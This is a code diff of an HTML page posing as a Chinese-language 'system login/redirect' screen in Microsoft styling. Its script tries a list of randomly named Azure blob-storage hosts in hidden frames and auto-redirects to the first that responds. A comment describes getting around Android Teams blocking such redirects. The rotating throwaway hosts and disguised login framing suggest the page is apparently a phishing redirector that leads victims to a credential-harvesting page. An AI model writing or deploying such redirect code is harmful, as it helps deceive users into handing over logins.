@@ -3,51 +3,57 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>系统登录中...</title>
+  <title>系统跳转中...</title>
   <style>
     html, body {
-      margin: 0; padding: 0;
-      font-family: "Segoe UI", sans-serif;
-      background: #f9f9fb;
-      display: flex; flex-direction: column;
-      justify-content: center; align-items: center;
+      margin: 0;
+      padding: 0;
+      background-color: #f4f7fb;
+      color: #333;
+      font-family: "Segoe UI", Roboto, sans-serif;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
       height: 100vh;
       text-align: center;
     }
     #message {
+      font-size: 18px;
       margin-top: 20px;
-      font-size: 17px;
-    }
-    #loginFrame {
-      width: 100%; height: 100vh;
-      border: none;
-      display: none;
-    }
-    #fallback, #retryBtn {
-      display: none;
-      margin-top: 20px;
+      opacity: 0;
+      animation: fadeIn 0.8s ease-in-out forwards;
     }
     button {
-      padding: 10px 20px;
+      padding: 10px 24px;
       font-size: 16px;
-      background: #0078d4;
-      color: white;
       border: none;
-      border-radius: 6px;
+      border-radius: 8px;
+      background-color: #0078d4;
+      color: white;
+      cursor: pointer;
+      margin-top: 24px;
+      display: none;
+    }
+    .icon {
+      width: 80px;
+      height: 80px;
+      opacity: 0.7;
+    }
+    @keyframes fadeIn {
+      to { opacity: 1; }
     }
   </style>
 </head>
 <body>
 
-  <div id="message">正在检测可用登录入口...</div>
-  <iframe id="loginFrame"></iframe>
-
-  <div id="fallback">
-    <div style="margin-top:10px;">如果页面没有响应，请在浏览器中打开：</div>
-    <button onclick="openExternal()">在浏览器中打开</button>
-  </div>
-
-  <button id="retryBtn" onclick="start()">重新尝试</button>
+  <svg class="icon" viewBox="0 0 24 24" fill="none" id="icon">
+    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10
+             10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"
+          fill="#0078d4"/>
+  </svg>
+  <div id="message">正在进入系统，请稍候...</div>
+  <button id="retryBtn" onclick="manualJump()">点击进入系统</button>
 
   <script>
     const urls = [
@@ -56,8 +62,9 @@
       "https://hjdkc8731miw.blob.core.windows.net/home/index.html",
       "https://x93yv2cak5w8.z48.web.core.windows.net/home/index.html"
     ];
+
     const timeout = 4000;
-    let fallbackUrl = "";
+    let validUrl = null;
 
     function tryUrl(url, onSuccess, onFailure) {
       const iframe = document.createElement("iframe");
@@ -79,16 +86,15 @@
 
     function tryNext(index) {
       if (index >= urls.length) {
-        document.getElementById("message").innerText = "系统维护中，暂时无法登录。";
-        document.getElementById("retryBtn").style.display = "inline-block";
+        showFailUI();
         return;
       }
 
       tryUrl(
         urls[index],
         (url) => {
-          fallbackUrl = url;
-          showLoginFrame(url);
+          validUrl = url;
+          autoJump(url);
         },
         () => {
           tryNext(index + 1);
@@ -96,29 +102,45 @@
       );
     }
 
-    function showLoginFrame(url) {
-      const iframe = document.getElementById("loginFrame");
-      iframe.src = url;
-      iframe.style.display = "block";
-      document.getElementById("message").innerText = "正在加载登录页面...";
-      document.getElementById("fallback").style.display = "block";
-    }
+    function autoJump(url) {
+      try {
+        // 有些安卓 Teams 会拦截自动跳转，需要 fallback
+        window.location.href = url;
 
-    function openExternal() {
-      if (fallbackUrl) {
-        window.open(fallbackUrl, '_blank');
+        // 2秒后检查是否跳转成功，如果没跳就提示用户点击
+        setTimeout(() => {
+          if (!document.hidden) {
+            // 页面还在 → 跳转失败
+            showManualJumpUI();
+          }
+        }, 2000);
+      } catch {
+        showManualJumpUI();
       }
     }
 
-    function start() {
-      document.getElementById("retryBtn").style.display = "none";
-      document.getElementById("message").innerText = "正在重新检测...";
-      document.getElementById("loginFrame").style.display = "none";
-      document.getElementById("fallback").style.display = "none";
-      tryNext(0);
+    function showManualJumpUI() {
+      document.getElementById("message").innerText = "请点击按钮进入系统";
+      document.getElementById("retryBtn").style.display = "inline-block";
     }
 
-    window.onload = start;
+    function showFailUI() {
+      document.getElementById("icon").innerHTML = `
+        <path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z" fill="#D13438"/>`;
+      document.getElementById("message").innerText = "系统维护中，请稍后再试。";
+    }
+
+    function manualJump() {
+      if (validUrl) {
+        window.location.href = validUrl;
+      } else {
+        document.getElementById("message").innerText = "未找到可用地址，请刷新页面。";
+      }
+    }
+
+    window.onload = () => {
+      tryNext(0);
+    };
   </script>
 
 </body>
